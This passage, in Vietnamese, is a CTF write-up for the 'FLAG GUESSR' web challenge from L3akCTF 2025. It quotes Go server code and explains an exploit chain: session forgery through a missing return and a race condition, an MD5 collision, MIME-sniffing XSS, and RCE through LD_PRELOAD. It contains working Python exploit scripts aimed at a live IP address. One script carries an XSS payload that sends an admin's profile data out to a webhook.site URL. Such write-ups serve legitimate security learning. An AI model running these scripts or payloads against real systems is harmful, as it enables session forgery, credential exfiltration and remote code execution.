\u0026quot;/register?e=internal server error\u0026quot; return } f, err := os.OpenFile(fmt.Sprintf(\u0026quot;./userdata/%s/flag.txt\u0026quot;, newUser.UserID), os.O_WRONLY|os.O_CREATE, 0644) if err != nil { session.ClearSession() resp.Body = \u0026quot;/register?e=internal server error\u0026quot; return } defer f.Close() _, err = io.Copy(f, flagFile) if err != nil { session.ClearSession() resp.Body = \u0026quot;/register?e=internal server error\u0026quot; return } // Chi co o day la khong clear session =)) err = newUser.InsertUser() if err != nil { resp.Body = \u0026quot;/register?e=bad request\u0026quot; return } session.InitSession(newUser) resp.Body = \u0026quot;/home\u0026quot; } Ở đây ta thấy sau khi check session invalid thì đáng lẽ phải return khỏi hàm luôn nhưng ở đây thì check thiếu cái đấy. Dẫn đến việc hàm defer UpdateSession sẽ được gọi và sign luôn cái session cookie của mình và đến đoạn này đáng lẽ ta sẽ có được cookie đã được sign nhưng sẽ bị clear nếu như session.ClearSession được gọi. Đọc tiếp ta sẽ thấy chỉ duy nhất một case Session không bị clear là đoạn newUser.InsertUser() . Để hàm này bị error thì ta chỉ cần tạo 2 user giống username và display_name là được vì trong config của db : `CREATE TABLE users (user_id text UNIQUE, username text COLLATE NOCASE, password text, display_name text, description text NULL, user_type integer, cheater integer, PRIMARY KEY (username, display_name));` Ta thấy PRIMARY KEY ở đây gồm cả (username,display_name) tức là một cặp này phải là unique. Vậy đến đây ta chỉ cần tạo 2 user giống nhau ? Không , ở trên có một đoạn checkUsernameAvaiable nữa. Bypass checkUsername Để qua được hàm này thì ta có thể để ý đến cái case được chỉ định cho username trong config là COLLATE NOCASE và nghĩ đến việc tryền 2 username khác case nhau nhưng đã bị block bởi toLowerCase() . Để bypass đoạn này thì ta có 2 cách dẫn đến 2 solution khác nhau : Race condition Leak display_name Mình sẽ giải thích cách 2 sau. Cách 1 thì race condition thì đấy , race thôi\u0026hellip;.\nScript của mình như sau :\nimport requests import threading import jwt JWT_KEY =\u0026quot;FUCK\u0026quot; FLAG_SO_ID = \u0026quot;\u0026quot; MALICOUS_SESSION =\u0026quot;\u0026quot; url = \u0026quot;http://localhost:5555\u0026quot; url = \u0026quot;http://34.59.119.124:17005\u0026quot; def register(username, password): s= requests.Session() data = { \u0026quot;username\u0026quot;: username, \u0026quot;password\u0026quot;: password, \u0026quot;display_name\u0026quot;: \u0026quot;1337\u0026quot;, } payload = {\u0026quot;username\u0026quot;:\u0026quot;sa\u0026quot;,\u0026quot;user_id\u0026quot;:FLAG_SO_ID,\u0026quot;display_name\u0026quot;:\u0026quot;1337\u0026quot;,\u0026quot;user_kind\u0026quot;:0,\u0026quot;flags_checked\u0026quot;:0,\u0026quot;flags_found\u0026quot;:0, \u0026quot;properties\u0026quot; : { \u0026quot;description\u0026quot; : \u0026quot;FUCk\u0026quot; , \u0026quot;LD_PRELOAD\u0026quot; : f\u0026quot;/app/userdata/{FLAG_SO_ID}/flag.txt\u0026quot;, },\u0026quot;logged_in\u0026quot; :True} token = jwt.encode(payload, JWT_KEY, algorithm=\u0026quot;HS256\u0026quot;) with open(\u0026quot;flag.so\u0026quot;, \u0026quot;rb\u0026quot;) as flag_file: files = {\u0026quot;flag\u0026quot;: flag_file} cookies = {\u0026quot;session\u0026quot;: token} response = requests.post(f\u0026quot;{url}/register\u0026quot;,data=data, files=files, cookies=cookies, allow_redirects=False) print(response.cookies) return response def login(username, password): s = requests.Session() data = { \u0026quot;username\u0026quot;: username, \u0026quot;password\u0026quot;: password, } response = s.post(f\u0026quot;{url}/login\u0026quot;, data=data,allow_redirects=False) print(response.cookies) return s def getProfile(session): res = session.get(url+'/api/profile',allow_redirects=False) print(res.text) return res.json()['user_id'] username = \u0026quot;sa\u0026quot; password = \u0026quot;s\u0026quot; register(username,password) s= login(username,password) FLAG_SO_ID = getProfile(s) print(f\u0026quot;FLAG_SO_ID: {FLAG_SO_ID}\u0026quot;) ## Start RACE CONDITION TO BYPASS CHECKUSERNAME AND REACH THE INSERT ###J username=\u0026quot;aaaa\u0026quot; password =\u0026quot;s\u0026quot; t1 = threading.Thread(target=register, args=(username, password)) t2 = threading.Thread(target=register, args=(username, password)) t1.start() t2.start() t1.join() t2.join() Flow :\nUpload So File Forge session with race conditon Make ceritficate with forged session Intend Leak display_name . Bởi vì username admin luôn được tạo với Admin-* nên case của ta sẽ không bao giờ bị catch :\u0026gt; . Vậy vấn đề để trigger bug thì phải insert đúng chính xác display_name . Đến đây thì mình có nghĩ đến cách CSRF vì có bug CSRF :) nma ko có effect vì có cors :( :sadge\nVậy thứ ta cần ở đây là XSS. Chỗ nào có xss nhỉ ? Check trên các page html thì ta không hề thấy sự xuất hiện của innerHTML nên ta có thể loại bỏ trường hợp này.\nNhưng server có thể trả về response theo 2 cách , 1 trong 2 cách đó là trả về RAW RESPONSE\nfunc (r *Response) respondRaw() error { if r.Responded { return nil } if r.RespCode == 0 { r.RespCode = http.StatusOK } r.Writer.WriteHeader(r.RespCode) respBytes, ok := r.Body.([]byte) if !ok { return fmt.Errorf(\u0026quot;invalid body\u0026quot;) } _, err := r.Writer.Write(respBytes) r.Responded = true return err } Bug này khá giống với MIME SNIFFER của chromium khi sẽ auto detect content type dựa trên các 512 bytes đầu tiên có khá nhiều cách : https://chromium.googlesource.com/chromium/src/net/+/master/base/mime_sniffer.cc Đơn giản là chèn \u003c!DOCTYPE\u003e prefix vào phía trước thôi.\nVậy hàm này được sử dụng ở đâu ? func GetGuess(w http.ResponseWriter, r *http.Request) { session, valid, resp, err := RequestMiddleware(w, r) defer resp.respond() if err != nil { return } if !valid || !session.LoggedIn { session.ClearSession() session.UpdateSession(w) resp.setError(fmt.Errorf(\u0026quot;not logged in\u0026quot;), http.StatusUnauthorized) return } defer session.UpdateSession(w) guesserID := r.PathValue(\u0026quot;guesser_id\u0026quot;) guessID := r.PathValue(\u0026quot;guess_id\u0026quot;) guesser, err := FindUser(guesserID) if err != nil { resp.setError(fmt.Errorf(\u0026quot;user not found\u0026quot;), http.StatusBadRequest) return } guess, err := guesser.FindGuess(guessID) if err != nil { resp.setError(fmt.Errorf(\u0026quot;guess not found\u0026quot;), http.StatusBadRequest) return } if session.UserKind != UserKindAdmin \u0026amp;\u0026amp; guess.GuesserID != session.UserID { resp.setError(fmt.Errorf(\u0026quot;only admins can see other users' guesses\u0026quot;), http.StatusBadRequest) return } guessPath := guess.GetFilePath() guessBytes, err := os.ReadFile(guessPath) if err != nil { resp.setError(fmt.Errorf(\u0026quot;incorrect guesses not saved\u0026quot;), http.StatusBadRequest) return } resp.Body = guessBytes resp.respondRaw() } Xài duy nhất ở hàm này. Hàm này sẽ đọc từ file đã guess của user và trả về response nên ta cần handle được nội dung trong file đấy. Phần khó chính là hàm checkFlag khá khó chịu :\nfunc CheckFlag(w http.ResponseWriter, r *http.Request) { session, valid, resp, err := RequestMiddleware(w, r) defer resp.respond() if err != nil { return } if !valid || !session.LoggedIn { session.ClearSession() session.UpdateSession(w) resp.setError(fmt.Errorf(\u0026quot;not logged in\u0026quot;), http.StatusUnauthorized) return } defer session.UpdateSession(w) if r.ContentLength == 0 { resp.setError(fmt.Errorf(\u0026quot;missing body\u0026quot;), http.StatusBadRequest) return } defer r.Body.Close() flagGuess := r.FormValue(\u0026quot;flag\u0026quot;) flagHolderID := r.PathValue(\u0026quot;id\u0026quot;) u, err := FindUser(flagHolderID) if err != nil { resp.setError(fmt.Errorf(\u0026quot;user not found\u0026quot;), http.StatusBadRequest) return } if u.UserID == session.UserID { resp.setError(fmt.Errorf(\u0026quot;you can't guess your own flag\u0026quot;), http.StatusBadRequest) return } guess := Guess{ GuessID: uuid.NewString(), GuesserID: session.UserID, FlagHolderID: u.UserID, Correct: false, } alreadyFound, err := guess.CheckFound() if err != nil { resp.setError(err, http.StatusBadRequest) return } if alreadyFound { resp.setError(fmt.Errorf(\u0026quot;you already found that flag\u0026quot;), http.StatusBadRequest) return } err = guess.InsertGuess() if err != nil { resp.setError(err, http.StatusBadRequest) return } guessPath := guess.GetFilePath() err = os.WriteFile(guessPath, []byte(flagGuess), 0644) if err != nil { resp.setError(err, http.StatusBadRequest) return } correct, md5, sha := guess.CheckGuess() if correct { guess.MarkCorrect() } if !correct { os.Remove(guessPath) } else { os.WriteFile(guessPath, []byte(fmt.Sprintf(\u0026quot;MD5: %s\\nSHA256: %s\u0026quot;, md5, sha)), 0644) } resp.Body = FlagCheckResponse{Correct: correct} } Hàm này sẽ kiểm tra md5sum của 2 file có bằng nhau không và sha256 của 2 file có bằng nhau không , nếu không bằng nó sẽ xóa file còn nếu bằng thì nó sẽ viết giá trị của MD5 và SHA256 vào file ?\nCả 2 điều kiện trên mình đều thật sư không cần \u0026hellip; Vậy phải làm sao để ghi file của mình vào ? Đọc vào hàm CheckGuess ta có thể thấy một trigger sau khá dị func (g *Guess) CheckGuess() (bool, string, string) { ... if md5Equal != shaEqual { g.MarkCheater() } ... Nếu như md5 bằng nhưng sha không bằng thì sẽ gọi MarkCheater ? Và trolling ở đây là hàm MarkCheater này sẽ gây crash program do thiếu dấu \u0026ldquo;?\u0026rdquo; holy fack\nMARK_CHEATER = `UPDATE users SET cheater = 1 WHERE user_id = ;` MÌnh đã không nghĩ tới trường hợp này trong lúc giải và cũng đã không test thử function này đó là lý do mình ko tìm được bug . Vì serverr hỗ trợ autorestart nên lúc này hàm crash và file của mình sẽ không bị xóa . Nhưng còn một điều nữa là mình cần phải có md5 EQUAL thì cái nì khá đơn giản vì có lỗi md5 collision khá nổi tiếng và có tool hỗ trợ là fastcoll .\nKhi có được xss thì ta chỉ cần redirect bot tới : /api/users/{guesser_id}/guesses/guess_id Stole được display_name và register với username admin và display_name cùng với session cần được signed và phần còn lại như trên Script của mình :\nimport requests import threading import jwt admin_username = \u0026quot;admin-71aaf14e-55d3-4a88-8c31-e9db2f265c3e\u0026quot; admin_displayName = \u0026quot;eccdce48-7f26-421b-9d75-65f7002453d5\u0026quot; JWT_KEY =\u0026quot;FUCK\u0026quot; FLAG_SO_ID = \u0026quot;\u0026quot; MALICOUS_SESSION =\u0026quot;\u0026quot; url = \u0026quot;http://localhost:5555\u0026quot; url = \u0026quot;http://34.59.119.124:17005\u0026quot; XSS_PATH = \u0026quot;\u0026quot; def register(username, password,display_name=\u0026quot;1337\u0026quot;,payload=None): s= requests.Session() data = { \u0026quot;username\u0026quot;: username, \u0026quot;password\u0026quot;: password, \u0026quot;display_name\u0026quot;: display_name, } token = \u0026quot;\u0026quot; if payload : token = jwt.encode(payload, JWT_KEY, algorithm=\u0026quot;HS256\u0026quot;) with open(\u0026quot;flag.so\u0026quot;, \u0026quot;rb\u0026quot;) as flag_file: files = {\u0026quot;flag\u0026quot;: flag_file} cookies = {\u0026quot;session\u0026quot;: token} response = requests.post(f\u0026quot;{url}/register\u0026quot;,data=data, files=files, cookies=cookies, allow_redirects=False) print(response.cookies) return response def login(username, password): s = requests.Session() data = { \u0026quot;username\u0026quot;: username, \u0026quot;password\u0026quot;: password, } response = s.post(f\u0026quot;{url}/login\u0026quot;, data=data,allow_redirects=False) print(response.cookies) return s def getProfile(session): res = session.get(url+'/api/profile',allow_redirects=False) print(res.text) return res.json() def bot(session) : global XSS_PATH payload = \u0026quot;fetch('/api/profile').then(res=\u0026gt;res.json()).then(text=\u0026gt;fetch('https://webhook.site/49982724-4ed4-4980-bdbc-f7efed1b6335?q='+text.display_name+'\u0026amp;u='+text.username))\u0026quot; data = { \u0026quot;url\u0026quot; : XSS_PATH + \u0026quot;#\u0026quot; +payload } res = session.post(url+'/api/report',json=data) print(res.text) def createMsg1(username,password): s= requests.Session() data = { \u0026quot;username\u0026quot;:username, \u0026quot;password\u0026quot;: password, \u0026quot;display_name\u0026quot;: \u0026quot;1337\u0026quot;, } with open(\u0026quot;msg1.bin\u0026quot;, \u0026quot;rb\u0026quot;) as flag_file: files = {\u0026quot;flag\u0026quot;: flag_file} response = requests.post(f\u0026quot;{url}/register\u0026quot;,data=data, files=files, allow_redirects=False) print(response.cookies) return response def checkFlag(session,checked_id,checker_id) : global XSS_PATH with open(\u0026quot;msg2.bin\u0026quot;, \u0026quot;rb\u0026quot;) as f: data = { \u0026quot;flag\u0026quot;: f.read() } try : response = session.post(f\u0026quot;{url}/api/users/{checked_id}/checkflag\u0026quot;,data=data,allow_redirects=False) print(\u0026quot;FAIL\u0026quot;) except : print(\u0026quot;SUCCESSFULLLY\u0026quot;) res = session.get(f\u0026quot;{url}/api/users/{checker_id}/guesses\u0026quot;,allow_redirects=False) guess_id = res.json()['guesses'][-1]['guess_id'] XSS_PATH += f\u0026quot;/api/users/{checker_id}/guesses/{guess_id}\u0026quot; print(\u0026quot;XSS_URL: \u0026quot;, XSS_PATH) ##Create HasH if admin_displayName ==\u0026quot;\u0026quot; : username= \u0026quot;fucaka\u0026quot; password= \u0026quot;fuckaa\u0026quot; createMsg1(username,password) s = login(username,password) msg1Id = getProfile(s) print(f\u0026quot;MSG1 ID = {msg1Id}\\n\u0026quot;) ## Createt guesser username = \u0026quot;guessers\u0026quot; password = \u0026quot;guessers\u0026quot; register(username,password) s = login(username,password) guesserId = getProfile(s) print(f\u0026quot;GUESSER ID = {guesserId}\u0026quot;) checkFlag(s,msg1Id,guesserId) bot (s) exit(0) ## Now we have the display name ## ## TIME TO EXPLOIT ## register(\u0026quot;SOaaa\u0026quot;,\u0026quot;SOaaa\u0026quot;) s = login(\u0026quot;SOaaa\u0026quot;,\u0026quot;SOaaa\u0026quot;) FLAG_SO = getProfile(s) print(f\u0026quot;FLAG_SO_ID: {FLAG_SO['user_id']}\u0026quot;) props = { \u0026quot;description\u0026quot; : \u0026quot;FUCk\u0026quot; , \u0026quot;LD_PRELOAD\u0026quot; : f\u0026quot;/app/userdata/{FLAG_SO['user_id']}/flag.txt\u0026quot;, } FLAG_SO[\u0026quot;logged_in\u0026quot;] = True FLAG_SO['properties'] = props register (admin_username,\u0026quot;?\u0026quot;,admin_displayName,FLAG_SO) New knowledge Rce gadget through ENV $LD_PRELOAD (mình khong biết điều này nên đã khá vướng bận khi tìm gadget rce) md5 collision Forgery session with race condition ( đôi khi không cần leak jwt key để có một signed session) Rút kinh nghiệm : Đọc kĩ hơn :) Test mọi case đề chặn Trình ","permalink":"https://3HLD.github.io/writeups/l3akctf2025/flagguessr/","title":"FLAG GUESSR"}]